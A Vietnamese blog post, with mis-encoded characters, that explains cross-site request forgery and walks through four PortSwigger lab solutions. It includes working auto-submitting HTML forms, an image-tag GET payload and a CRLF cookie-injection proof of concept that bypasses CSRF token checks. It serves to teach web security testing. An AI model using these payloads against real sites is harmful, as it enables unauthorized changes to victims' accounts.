---
layout: post
title:  "CSRF"
date:   2025-08-07 16:37:00 +0700
tags: PortSwigger
categories: jekyll update
---

# CSRF - (Cross-site request forgery) 

## CSRF lÃ  gÃ¬? 

Dá»‹ch ra cho dá»… hiá»ƒu thÃ¬ CSRF lÃ  **"táº¥n cÃ´ng giáº£ máº¡o yÃªu cáº§u tá»« trang chÃ©o"** cho phÃ©p attacker Ã©p ngÆ°á»i dÃ¹ng thá»±c hiá»‡n cÃ¡c hÃ nh Ä‘á»™ng mÃ  há» ko há» mong muá»‘n. 

Lá»— há»•ng nÃ y cho phÃ©p attacker pháº§n nÃ o vÆ°á»£t qua chÃ­nh sÃ¡ch cÃ¹ng nguá»“n (Same Origin Policy) - má»™t cÆ¡ cháº¿ báº£o máº­t vá»‘n Ä‘Æ°á»£c thiáº¿t káº¿ Ä‘á»ƒ ngÄƒn cÃ¡c website khÃ¡c nhau can thiá»‡p láº«n nhau. 

## TÃ¡c Ä‘á»™ng cá»§a CSRF lÃ  gÃ¬? 

Náº¿u táº¥n cÃ´ng CSRF thÃ nh cÃ´ng, attacker khiáº¿n ngÆ°á»i dÃ¹ng vÃ´ tÃ¬nh thá»±c hiá»‡n má»™t hÃ nh Ä‘á»™ng nÃ o Ä‘Ã³. 
- Thay Ä‘á»•i Ä‘á»‹a chá»‰ email trong tÃ i khoáº£n. 
- Thay Ä‘á»•i máº­t kháº©u. 
- Thá»±c hiá»‡n má»™t giao dá»‹ch chuyá»ƒn tiá»n 

TÃ¹y vÃ o ngá»¯ cáº£nh mÃ  attacker cÃ³ thá»ƒ gÃ¢y má»©c áº£nh hÆ°á»Ÿng nhiá»u hÆ¡n.

## CSRF hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ o ? 

Äá»ƒ thá»±c hiá»‡n CSRF, thÃ¬ cáº§n cÃ³ 3 Ä‘iá»u kiá»‡n: 
- **Má»™t hÃ nh Ä‘á»™ng cÃ³ liÃªn quan** => á»©ng dá»¥ng pháº£i tá»“n táº¡i má»™t hÃ nh Ä‘á»™ng mÃ  attacker cÃ³ lÃ½ do Ä‘á»ƒ dá»¥ ngÆ°á»i dÃ¹ng thá»±c hiá»‡n.
    - má»™t hÃ nh Ä‘á»™ng Ä‘áº·c quyá»n => chá»‰nh sá»­a quyá»n cá»§a ngÆ°á»i dÃ¹ng khÃ¡c 
    - báº¥t ká»³ hÃ nh Ä‘á»™ng nÃ o liÃªn quan Ä‘áº¿n dá»¯ liá»‡u cá»§a chÃ­nh ngÆ°á»i dÃ¹ng => thay Ä‘á»•i máº­t kháº©u cá»§a ngÆ°á»i dÃ¹ng. 
- **Xá»­ lÃ½ phiÃªn dá»±a trÃªn cookie** => viá»‡c thá»±c hiá»‡n hÃ nh Ä‘á»™ng sáº½ táº¡o ra má»™t hoáº·c nhiá»u request HTTP, vÃ  á»©ng dá»¥ng chá»‰ dá»±a vÃ o session cookie Ä‘á»ƒ xÃ¡c Ä‘á»‹nh ngÆ°á»i dÃ¹ng nÃ o Ä‘Ã£ gá»­i cÃ¡c request Ä‘Ã³. 
- **KhÃ´ng cÃ³ tham sá»‘ yÃªu cáº§u khÃ³ Ä‘oÃ¡n** => CÃ¡c yÃªu cáº§u thá»±c hiá»‡n hÃ nh Ä‘á»™ng khÃ´ng chá»©a báº¥t ká»³ tham sá»‘ nÃ o cÃ³ giÃ¡ trá»‹ mÃ  káº» táº¥n cÃ´ng khÃ´ng thá»ƒ xÃ¡c Ä‘á»‹nh hoáº·c Ä‘oÃ¡n Ä‘Æ°á»£c. 
    - Náº¿u attacker muá»‘n khiáº¿n ngÆ°á»i dÃ¹ng thay Ä‘á»•i máº­t kháº©u, thÃ¬ chá»©c nÄƒng sáº½ khÃ´ng dá»… bá»‹ táº¥n cÃ´ng náº¿u nÃ³ yÃªu cáº§u káº» táº¥n cá»•ng pháº£i biáº¿t máº­t kháº©u hiá»‡n táº¡i cá»§a ngÆ°á»i dÃ¹ng. 

VÃ­ dá»¥ 1 á»©ng dá»¥ng cho phÃ©p thay Ä‘á»•i máº­t kháº©u trÃªn chÃ­nh account cá»§a há». Khi mÃ  user thá»±c hiá»‡n chá»©c nÄƒng nÃ y thÃ¬ sáº½ táº¡o 1 HTTP request nhÆ° sau: 

```HTTP 
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```
ThÃ¬ request nÃ y hoÃ n toÃ n Ä‘á»§ cÃ¡c Ä‘iá»u kiá»‡n. 
- Ã©p ngÆ°á»i dÃ¹ng thá»±c hiá»‡n thay Ä‘á»•i email 
- á»©ng dá»¥ng xÃ¡c thá»±c ngÆ°á»i dÃ¹ng chá»‰ báº±ng cookie mÃ  ko cÃ³ biá»‡n phÃ¡p báº£o vá»‡ khÃ¡c nhÆ° csrf token 
- attacker biáº¿t trÆ°á»›c cÃ¡c tham sá»‘ cáº§n thiáº¿t khi gá»­i request.

Vá»›i cÃ¡c Ä‘iá»u kiá»‡n trÃªn thÃ¬ attacker cÃ³ thá»ƒ táº¡o ra 1 form HTML giáº£ máº¡o nhÆ° sau: 

```HTML
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
``` 

Náº¿u user Ä‘i vÃ o trong trang web giáº£ máº¡o cá»§a attacker, thÃ¬ sáº½:
- Trang cá»§a attacker sáº½ kÃ­ch hoáº¡t má»™t yÃªu cáº§u HTTP Ä‘áº¿n website dá»… bá»‹ táº¥n cÃ´ng.
- Náº¿u náº¡n nhÃ¢n Ä‘ang Ä‘Äƒng nháº­p vÃ o website Ä‘Ã³, trÃ¬nh duyá»‡t cá»§a há» tá»± Ä‘á»™ng Ä‘Ã­nh kÃ¨m cookie session vÃ o yÃªu cáº§u - trá»« khi cookie Ä‘Æ°á»£c cáº¥u hÃ¬nh vá»›i thuá»™c tÃ­nh `SameSite` cháº·t cháº½. 
- Website dá»… bá»‹ táº¥n cÃ´ng sáº½ xá»­ lÃ½ yÃªu cáº§u nhÆ° bÃ¬nh thÆ°á»ng, coi Ä‘Ã³ lÃ  hÃ nh Ä‘á»™ng há»£p lá»‡ cá»§a ngÆ°á»i dÃ¹ng vÃ  sáº½ thá»±c hiá»‡n thay Ä‘á»•i email theo yÃªu cáº§u giáº£ máº¡o cá»§a attacker.

## XÃ¢y dá»±ng 1 cuá»™c táº¥n cÃ´ng CSRF nhÆ° tháº¿ nÃ o? 

Táº¡o thá»§ cÃ´ng HTML thÃ¬ rÆ°á»m rÃ  nÃªn dÃ¹ng CSRF Poc generator. 
- Chá»n 1 request báº¥t ká»³ Ä‘Ã¢u Ä‘á»ƒ test.
- Tá»« menu chuá»™t pháº£i, chá»n `Engagement tools / Generate CSRF Poc`
- Burp Suite sáº½ táº¡o ra Ä‘oáº¡n mÃ£ HTML giÃºp kÃ­ch hoáº¡t request Ä‘Ã£ chá»n (trá»« pháº§n cookie, cookie sáº½ tá»± Ä‘á»™ng Ä‘Æ°á»£c trÃ¬nh duyá»‡t cá»§a náº¡n nhÃ¢n thÃªm vÃ o).
- CÃ³ thá»ƒ tinh chá»‰nh cÃ¡c tÃ¹y chá»n trong trÃ¬nh táº¡o CSRF PoC Ä‘á»ƒ Ä‘iá»u chá»‰nh chi tiáº¿t cá»§a cuá»™c táº¥n cÃ´ng. Äiá»u nÃ y há»¯u Ã­ch trong cÃ¡c trÆ°á»ng há»£p báº¥t thÆ°á»ng khi request cÃ³ cÃ¡c Ä‘áº·c Ä‘iá»ƒm láº¡.
- Sao chÃ©p Ä‘oáº¡n mÃ£ HTML Ä‘Æ°á»£c táº¡o vÃ o má»™t trang web, má»Ÿ trang Ä‘Ã³ trong trÃ¬nh duyá»‡t Ä‘ang Ä‘Äƒng nháº­p vÃ o website dá»… bá»‹ táº¥n cÃ´ng vÃ  kiá»ƒm tra xem request cÃ³ Ä‘Æ°á»£c gá»­i thÃ nh cÃ´ng vÃ  hÃ nh Ä‘á»™ng mong muá»‘n cÃ³ xáº£y ra hay khÃ´ng.

### LAB01 

Lab nÃ y cÃ³ chá»©c nÄƒng thay Ä‘á»•i email vÃ  má»¥c tiÃªu lÃ  mÃ¬nh cáº§n thá»±c hiá»‡n CSRF Ä‘á»ƒ dá»¥ ngÆ°á»i dÃ¹ng thay Ä‘á»•i email. 

Äáº§u tiÃªn mÃ¬nh cáº§n login vÃ o 1 account `wiener:peter`, sau Ä‘Ã³ thá»­ update 1 email. 

![image](https://hackmd.io/_uploads/S1LpjKOPxg.png)

Tá»« Ä‘Ã¢y mÃ¬nh tháº¥y nÃ³ hoÃ n toÃ n thá»±c hiá»‡n Ä‘Æ°á»£c CSRF: 
- lÃ­ do Ä‘á»ƒ thá»±c hiá»‡n táº¥n cÃ´ng lÃ  thay Ä‘á»•i email 
- xÃ¡c thá»±c ngÆ°á»i dÃ¹ng dá»±a trÃªn cookie session 
- ko cÃ³ tham sá»‘ khÃ³ Ä‘oÃ¡n 

Sau Ä‘Ã³, mÃ¬nh chá»n vÃ o `Engagement tools / Generate CSRF Poc` 

![image](https://hackmd.io/_uploads/HJOjhKOwlg.png)

Tá»« Ä‘Ã¢y, nÃ³ Ä‘Ã£ táº¡o ra 1 form HTML nhÆ° sau: 

![image](https://hackmd.io/_uploads/BkBR3t_wlg.png)

Cuá»‘i cÃ¹ng mÃ¬nh copy form HTML nÃ y vÃ  Ä‘Æ°a vÃ o trong exploit server. 

![image](https://hackmd.io/_uploads/SkhtFouwgl.png)

Sau Ä‘Ã³, gá»­i cho victim thÃ¬ sáº½ solve Ä‘Æ°á»£c lab. 

## CÃ¡ch gá»­i má»™t Ä‘oáº¡n mÃ£ khai thÃ¡c CSRF Ä‘áº¿n náº¡n nhÃ¢n 

Káº» táº¥n cÃ´ng thÆ°á»ng Ä‘áº·t Ä‘oáº¡n HTML Ä‘á»™c háº¡i lÃªn 1 trang web do attacker kiá»ƒm soÃ¡t, rá»“i dá»¥ user truy cáº­p vÃ o trang Ä‘Ã³. 

Äiá»u nÃ y cÃ³ thá»ƒ thá»±c hiá»‡n thÃ´ng qua viá»‡c gá»­i liÃªn káº¿t qua email hoáº·c máº¡ng xÃ£ há»™i. Náº¿u Ä‘oáº¡n táº¥n cÃ´ng Ä‘Æ°á»£c chÃ¨n vÃ o má»™t trang web phá»• biáº¿n (vÃ­ dá»¥ nhÆ° pháº§n bÃ¬nh luáº­n), káº» táº¥n cÃ´ng chá»‰ cáº§n chá» náº¡n nhÃ¢n truy cáº­p trang web Ä‘Ã³. 

Má»™t sá»‘ cuá»™c táº¥n cÃ´ng CSRF Ä‘Æ¡n giáº£n chá»‰ dÃ¹ng phÆ°Æ¡ng thá»©c GET vÃ  cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c hiá»‡n thÃ´ng qua má»™t URL duy nháº¥t trÃªn trang web dá»… bá»‹ tá»•n thÆ°Æ¡ng. 
Trong trÆ°á»ng há»£p nÃ y, káº» táº¥n cÃ´ng khÃ´ng cáº§n táº¡o trang ngoÃ i, mÃ  chá»‰ cáº§n gá»­i URL Ä‘á»™c háº¡i trá»±c tiáº¿p cho náº¡n nhÃ¢n (qua email, máº¡ng xÃ£ há»™i,...)

```HTML 
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

### XSS vÃ  CSRF 

Giáº£i thÃ­ch sá»± khÃ¡c biá»‡t giá»¯a XSS vÃ  CSRF. 

### Sá»± khÃ¡c biá»‡t XSS vÃ  CSRF lÃ  gÃ¬? 

XSS cho phÃ©p attacker thá»±c hiá»‡n tÃ¹y Ã½ JavaScript vá»›i trÃ¬nh duyá»‡t cá»§a náº¡n nhÃ¢n. 

CSRF cho phÃ©p attacker dáº«n dá»¥ ngÆ°á»i dÃ¹ng thá»±c hiá»‡n nhá»¯ng hÃ nh Ä‘á»™ng mÃ  há» ko mong muá»‘n. 

Háº­u quáº£ cá»§a XSS thÃ¬ nghiÃªm trá»ng hÆ¡n CSRF, vÃ¬: 
- CSRF: attacker lá»«a ngÆ°á»i dÃ¹ng tá»± gá»­i request mÃ  ngÆ°á»i dÃ¹ng ko biáº¿t. NhÆ°ng attacker ko tháº¥y Ä‘Æ°á»£c pháº£n há»“i tá»« server.
- XSS: attacker cháº¡y Ä‘Æ°á»£c JavaScript trong trÃ¬nh duyá»‡t cá»§a ngÆ°á»i dÃ¹ng. Tá»« Ä‘Ã³ cÃ³ thá»ƒ gá»­i requets Ä‘á»c pháº£n há»“i, vÃ  Ä‘Ã¡nh cáº¯p dá»¯ liá»‡u nhÆ° cookie, token,...

### CSRF token cÃ³ thá»ƒ chá»‘ng Ä‘Æ°á»£c XSS ko ? 

Má»™t sá»‘ cuá»™c táº¥n cÃ´ng XSS cÃ³ thá»ƒ bá»‹ ngÄƒn cháº·n khi sá»­ dá»¥ng CSRF token má»™t cÃ¡ch hiá»‡u quáº£. 

```URL
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
``` 
ThÃªm CSRF token vÃ o thÃ¬ nhÆ° sau: 

```URL 
https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>
``` 

Giáº£ sá»­ server kiá»ƒm tra Ä‘Ãºng token CSRF vÃ  tá»« chá»‘i cÃ¡c request ko cÃ³ token há»£p lá»‡, thÃ¬ token nÃ y cÃ³ thá»ƒ ngÄƒn cháº·n viá»‡c khai thÃ¡c lá»— há»•ng XSS (Reflected XSS). 

Giáº£i thÃ­ch tá»« **cross-site scripting** - nghÄ©a lÃ  cuá»™c táº¥n cÃ´ng xuáº¥t phÃ¡t tá»« má»™t trang web khÃ¡c (**cross-site**). Khi attacker cá»‘ gáº¯ng gá»­i 1 request tá»« trang web há» kiá»ƒm soÃ¡t Ä‘áº¿n website náº¡n nhÃ¢n, náº¿u token CSRF token ko há»£p lá»‡ thÃ¬ request bá»‹ tá»« chá»‘i, vÃ  Ä‘oáº¡n script ko bao giá» Ä‘Æ°á»£c pháº£n há»“i Ä‘á»ƒ thá»±c thi. 

Nhá»¯ng má»‘i quan há»‡ quan trá»ng vá» má»‘i liÃªn há»‡ giá»¯a CSRF token vÃ  XSS::
1. Token CSRF khÃ´ng báº£o vá»‡ toÃ n bá»™ website khá»i XSS: 
    - Náº¿u cÃ³ lá»— há»•ng reflected XSS á»Ÿ chá»— ko cÃ³ token CSRF, thÃ¬ váº«n bá»‹ khai thÃ¡c.
2. XSS cÃ³ thá»ƒ vÆ°á»£t qua CSRF token: 
    - Náº¿u attacker Ä‘Ã£ khai thÃ¡c Ä‘Æ°á»£c lá»— há»•ng XSS á»Ÿ Ä‘Ã¢u Ä‘Ã³, attacker cÃ³ thá»ƒ viáº¿t script Ä‘á»ƒ: 
        - Gá»­i request ná»™i bá»™ Ä‘áº¿n láº¥y CSRF token.
        - DÃ¹ng token nÃ y thá»±c hiá»‡n hÃ nh vi nguy hiá»ƒm, nhÆ° Ä‘á»•i máº­t kháº©u, email,...
3. CSRF token ko cháº·n Ä‘Æ°á»£c lá»— há»•ng Stored XSS: 
    - Náº¿u trang cÃ³ stored XSS, thÃ¬ payload váº«n sáº½ cháº¡y khi náº¡n nhÃ¢n truy cáº­p trang, dÃ¹ trang Ä‘Ã³ cÃ³ CSRF token hay ko. 

## Má»™t vÃ i cÃ¡ch phÃ²ng thá»§ chá»‘ng láº¡i CSRF 

Nhá»¯ng cÆ¡ cháº¿ phÃ²ng thá»§ phá»• biáº¿n nháº¥t: 
- **CSRF token** - lÃ  má»™t giÃ¡ trá»‹ **duy nháº¥t**, **bÃ­ máº­t** vÃ  **khÃ³ Ä‘oÃ¡n**, Ä‘Æ°á»£c táº¡o ra tá»« server vÃ  chia sáº» vá»›i trÃ¬nh duyá»‡t. Khi thá»±c hiá»‡n má»™t hÃ nh Ä‘á»™ng nháº¡y cáº£m, cháº³ng háº¡n nhÆ° gá»­i form, phÃ­a client pháº£i gá»­i kÃ¨m token CSRF há»£p lá»‡ trong request. Äiá»u nÃ y khiáº¿n cho attacker ráº¥t khÃ³ Ä‘á»ƒ táº¡o ra má»™t request há»£p lá»‡ thay cho náº¡n nhÃ¢n. 
- **SameSite cookies** - lÃ  má»™t cÆ¡ cháº¿ báº£o máº­t cá»§a trÃ¬nh duyá»‡t giÃºp xÃ¡c Ä‘á»‹nh khi nÃ o cookie cá»§a má»™t website Ä‘Æ°á»£c gá»­i kÃ¨m theo cÃ¡c request báº¯t nguá»“n tá»« website khÃ¡c. Vá»›i chÃ­nh sÃ¡ch nÃ y, cookie Ä‘Äƒng nháº­p sáº½ ko Ä‘Æ°á»£c gá»­i kÃ¨m náº¿u yÃªu cáº§u Ä‘áº¿n tá»« trang khÃ¡c, tá»« Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng CSRF.
- **Referer-based validation** - á»¨ng dá»¥ng kiá»ƒm tra header Referer Ä‘á»ƒ xem yÃªu cáº§u cÃ³ Ä‘áº¿n tá»« cÃ¹ng domain hay khÃ´ng. Náº¿u khÃ´ng pháº£i, yÃªu cáº§u cÃ³ thá»ƒ bá»‹ cháº·n => chá»‘ng CSRF. Tuy nhiÃªn, khÃ´ng an toÃ n báº±ng CSRF token, vÃ¬ Referer cÃ³ bá»‹ cháº·n, áº©n, hoáº·c giáº£ máº¡o trong má»™t sá»‘ trÆ°á»ng há»£p. 

## Bypass xÃ¡c thá»±c CSRF token 

### CSRF token lÃ  gÃ¬? 

**CSRF token** lÃ  má»™t giÃ¡ trá»‹ **duy nháº¥t**, **bÃ­ máº­t** vÃ  **khÃ³ Ä‘oÃ¡n**, Ä‘Æ°á»£c táº¡o ra tá»« server vÃ  chia sáº» vá»›i trÃ¬nh duyá»‡t. Khi thá»±c hiá»‡n má»™t hÃ nh Ä‘á»™ng nháº¡y cáº£m, cháº³ng háº¡n nhÆ° gá»­i form, phÃ­a client pháº£i gá»­i kÃ¨m token CSRF há»£p lá»‡ trong request. Äiá»u nÃ y khiáº¿n cho attacker ráº¥t khÃ³ Ä‘á»ƒ táº¡o ra má»™t request há»£p lá»‡ thay cho náº¡n nhÃ¢n. 

Má»™t cÃ¡ch phá»• biáº¿n Ä‘á»ƒ chia sáº» CSRF token vá»›i client lÃ  **chÃ¨n nÃ³ vÃ o dÆ°á»›i dáº¡ng má»™t trÆ°á»ng áº©n** trong form HTML, vÃ­ dá»¥: 

```HTML 
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
``` 

Submit form thÃ¬ káº¿t quáº£ sáº½ cá»§a request lÃ : 

```HTTP 
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
``` 

### Lá»— há»•ng chung trong xÃ¡c thá»±c CSRF token 

### XÃ¡c thá»±c CSRF token dá»±a trÃªn request method 

Má»™t vÃ i á»©ng dá»¥ng dÃ¹ng csrf token trong POST method nhÆ°ng láº¡i bá» qua trong GET method. 

```HTTP
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```
### LAB02 

Trong lab nÃ y thÃ¬ yÃªu cáº§u thá»±c hiá»‡n CSRF Ä‘á»ƒ Ä‘á»•i email. 

![image](https://hackmd.io/_uploads/BkhHmzcvgx.png)

NhÆ° váº­y thÃ¬ tháº¥y cÃ³ csrf Ä‘Æ°á»£c Ä‘Ã­nh trong method POST. NhÆ°ng mÃ¬nh Ä‘á»•i thÃ nh GET xem cÃ³ gÃ¬ xáº£y ra ko? 

![image](https://hackmd.io/_uploads/H1TcmMqwel.png)

ThÃ¬ hoÃ n toÃ n há»£p lÃ­ náº¿u mÃ¬nh truyá»n theo GET method. 

Váº­y thá»±c hiá»‡n thao tÃ¡c táº¥n cÃ´ng nhÆ° lab trÃªn. 

![image](https://hackmd.io/_uploads/SyZvSf9vge.png)

### XÃ¡c thá»±c csrf token phá»¥ thuá»™c vÃ o sá»± tá»“n táº¡i cá»§a token nÃ y trong request. 

Má»™t vÃ i á»©ng dá»¥ng thá»±c hiá»‡n xÃ¡c thá»±c token Ä‘Ãºng cÃ¡ch khi token cÃ³ máº·t, nhÆ°ng láº¡i bá» qua bÆ°á»›c xÃ¡c thá»±c náº¿u token bá»‹ thiáº¿u. 

Dáº«n Ä‘áº¿n attacker cÃ³ thá»ƒ bá» toÃ n bá»™ tham sá»‘ chá»©a mÃ£ token Ä‘á»ƒ vÆ°á»£t qua quÃ¡ trÃ¬nh xÃ¡c thá»±c vÃ  thá»±c hiá»‡n táº¥n cÃ´ng CSRF. 

```HTTP
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

![image](https://hackmd.io/_uploads/S1hOdMcPll.png)

NÃªn mÃ¬nh thá»­ xÃ³a Ä‘i toÃ n bá»™ tham sá»‘ csrf xem nÃ³ cÃ³ hoáº¡t Ä‘á»™ng ko ?

![image](https://hackmd.io/_uploads/rkpbtz9vlg.png)

ThÃ¬ nÃ³ hoÃ n toÃ n váº«n cÃ³ thá»ƒ thá»±c hiá»‡n Ä‘Æ°á»£c. 

NÃªn mÃ¬nh Ä‘á»ƒ cÃ³ thá»ƒ táº¥n cÃ´ng nhÆ° sau: 

![image](https://hackmd.io/_uploads/SktEhf9Dxx.png)

### CSRF token khÃ´ng Ä‘Æ°á»£c liÃªn káº¿t vá»›i phiÃªn cá»§a ngÆ°á»i dÃ¹ng 

ÄÃ¢y lÃ  má»™t lá»—i triá»ƒn khai CSRF token phá»• biáº¿n, lÃ  server ko rÃ ng buá»™c csrf token vá»›i phiÃªn ngÆ°á»i dÃ¹ng cá»¥ thá»ƒ mÃ  chá»‰ kiá»ƒm tra sá»± tá»“n táº¡i cá»§a token trong danh sÃ¡ch Ä‘Ã£ phÃ¡t sinh. 

Äiá»u nÃ y cho phÃ©p attacker tÃ¡i sá»­ dá»¥ng token tá»« tÃ i khoáº£n cá»§a chÃ­nh mÃ¬nh Ä‘á»ƒ táº¥n cÃ´ng ngÆ°á»i dÃ¹ng khÃ¡c - lÃ m cho cÆ¡ cháº¿ báº£o vá»‡ CSRF trá»Ÿ nÃªn vÃ´ hiá»‡u. 

### LAB03 

á» lab nÃ y mÃ¬nh Ä‘Æ°á»£c cáº¥p hai tÃ i khoáº£n. 

Äáº§u tiÃªn mÃ¬nh Ä‘Äƒng nháº­p vÃ o account Ä‘áº§u tiÃªn lÃ  `wiener:peter` vÃ  change email, dÃ¹ng intercept Ä‘á»ƒ cháº·n request xong rá»“i copy cÃ¡i csrf_token rá»“i drop Ä‘i. 

![image](https://hackmd.io/_uploads/SyNkqXqwll.png)

Sau Ä‘Ã³, má»Ÿ 1 trÃ¬nh duyá»‡t áº©n danh rá»“i login vÃ o báº±ng tÃ i khoáº£n thá»© hai. 

![image](https://hackmd.io/_uploads/HJzf5mcvgg.png)

á» Ä‘Ã¢y cÅ©ng cÃ³ 1 csrf token. Váº­y náº¿u mÃ¬nh change email trong tÃ i khoáº£n carlos mÃ  csrf token cá»§a wiener thÃ¬ sao? 

![image](https://hackmd.io/_uploads/ByiU9mqwxg.png)

![image](https://hackmd.io/_uploads/rJLOq75Pel.png)

Tá»« Ä‘Ã¢y mÃ¬nh khai thÃ¡c nhÆ° sau: 

![image](https://hackmd.io/_uploads/Sywo9Qqvgl.png)

### CSRF token Ä‘Æ°á»£c rÃ ng buá»™c vá»›i má»™t cookie khÃ´ng thuá»™c phiÃªn lÃ m viá»‡c (non-session cookie)

Viá»‡c rÃ ng buá»™c token vá»›i 1 má»™t cookie ko liÃªn quan Ä‘áº¿n phiÃªn Ä‘Äƒng nháº­p lÃ  sai vá» máº·t logic báº£o máº­t, vÃ  táº¡o ra lá»— há»•ng CSRF nghiÃªm trá»ng, Ä‘áº·c biá»‡t lÃ  attacker cÃ³ thá»ƒ tÃ¡i sá»­ dÅ©ng token Ä‘Ã£ láº¥y Ä‘Æ°á»£c tá»« phiÃªn khÃ¡c. 

```HTTP
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```
Má»™t sá»‘ á»©ng dá»¥ng liÃªn káº¿t CSRF token vá»›i má»™t cookie riÃªng (khÃ´ng pháº£i cookie phiÃªn Ä‘Äƒng nháº­p). Äiá»u nÃ y váº«n cÃ³ thá»ƒ bá»‹ khai thÃ¡c náº¿u attacker tÃ¬m cÃ¡ch chÃ¨n cookie cá»§a mÃ¬nh vÃ o trÃ¬nh duyá»‡t cá»§a náº¡n nhÃ¢n.

Khi Ä‘Ã³, attacker dÃ¹ng tÃ i khoáº£n cá»§a mÃ¬nh Ä‘á»ƒ táº¡o token vÃ  cookie há»£p lá»‡, rá»“i Ã©p trÃ¬nh duyá»‡t náº¡n nhÃ¢n sá»­ dá»¥ng chÃºng. Nhá» váº­y, server sáº½ cháº¥p nháº­n token Ä‘Ã³ vÃ  cuá»™c táº¥n cÃ´ng CSRF thÃ nh cÃ´ng.

### LAB04 

Lab nÃ y thÃ¬ mÃ¬nh cÅ©ng Ä‘Æ°á»£c cung cáº¥p hai account tÆ°Æ¡ng tá»± nhÆ° lab. 

Äáº§u tiÃªn mÃ¬nh login vÃ o tÃ i khoáº£n `wiener:peter`

![image](https://hackmd.io/_uploads/B1vBgN5Pxg.png)

Tá»« Ä‘Ã¢y tháº¥y trong Cookie cÃ³ hai trÆ°á»ng lÃ  `session` vÃ  `csrfKey`, trong pháº§n thÃ¢n thÃ¬ cÃ³ `csrf`

Tiáº¿p tá»¥c login vÃ o tÃ i khoáº£n thá»© hai lÃ  `carlos`

![image](https://hackmd.io/_uploads/HyT0SEcwxe.png)

Náº¿u mÃ¬nh dÃ¹ng csrf vÃ  csrfKey cá»§a tÃ i khoáº£n weiner trong tÃ i khoáº£n carlos thÃ¬ sao? 

![image](https://hackmd.io/_uploads/ByOb8Nqvll.png)

![image](https://hackmd.io/_uploads/HyNMLNqDxe.png)

NhÆ° váº­y lÃ  do `csrfKey` náº±m trong pháº§n header, mÃ¬nh pháº£i tÃ¬m cÃ¡ch thay Ä‘á»•i `csrfKey` cá»§a náº¡n nhÃ¢n. 

**Tá»« Ä‘Ã¢y mÃ¬nh tháº¥y rÃµ lÃ  `csrfKey` vÃ  `csrf` Ä‘á»u ko thay Ä‘á»•i. Chá»‰ cÃ³ `session` thÃ¬ thay Ä‘á»•i thÃ´i.**

NhÆ° váº­y náº¿u mÃ¬nh set Ä‘Æ°á»£c `csrfKey` trong cookie vÃ  nháº­p Ä‘Ãºng `csrf` thÃ¬ Ä‘á»•i Ä‘Æ°á»£c email. 

VÃ  thÃ´ng qua chá»©c nÄƒng search cá»§a tháº¥y nhÆ° sau: 

![image](https://hackmd.io/_uploads/ByDg2VqDgg.png)

NÃ³ ko cÃ³ Ä‘Ã­nh kÃ¨m `csrfKey` trong response. Váº­y náº¿u mÃ¬nh truyá»n nhÆ° sau thÃ¬ sao: 

![image](https://hackmd.io/_uploads/SycIh4qPeg.png)

NhÆ° váº­y mÃ¬nh cÃ³ thá»ƒ set Ä‘Æ°á»£c `csrfKey` trong Cookie. VÃ  mÃ¬nh set thÃªm `SameSite=None` lÃ  má»™t giÃ¡ trá»‹ trong cookie, dÃ¹ng Ä‘á»ƒ cho phÃ©p cookie Ä‘Æ°á»£c gá»­i Ä‘i trong cÃ¡c yÃªu cáº§u giá»¯a cÃ¡c domain khÃ¡c nhau. 

Giá» mÃ¬nh táº¡o ra 1 form giáº£ Ä‘á»ƒ gá»­i tá»›i náº¡n nhÃ¢n. 

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a01002404dac1fc846a72ce000900a2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@gmail.com" />
      <input type="hidden" name="csrf" value="dq6P9ixWt9O5zOqMIglsZsJejRB7F8vm" />
      <input type="submit" value="Submit request" />
    </form>
		<img src="https://0a01002404dac1fc846a72ce000900a2.web-security-academy.net/?search=hahaha%0d%0aSet-Cookie: csrfKey=qjNuibHS4XFzEbJBFx5wWTvA6K7iVs3E; SameSite=None" onerror="document.forms[0].submit()">
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Do mÃ¬nh táº¥n cÃ´ng `weiner` nÃªn mÃ¬nh thay `csrf` vÃ  `csrfKey` cá»§a carlos. 

KhÃ´ng cáº§n táº¥n cÃ´ng trá»±c tiáº¿p vÃ o domain chÃ­nh. Chá»‰ cáº§n má»™t subdomain cÃ³ thá»ƒ Ä‘áº·t cookie â€” lÃ  cÃ³ thá»ƒ táº¥n cÃ´ng domain khÃ¡c trong cÃ¹ng há»‡ thá»‘ng.

### CSRF Token Ä‘Æ¡n giáº£n chá»‰ Ä‘Æ°á»£c sao chÃ©p vÃ o trong Cookie 

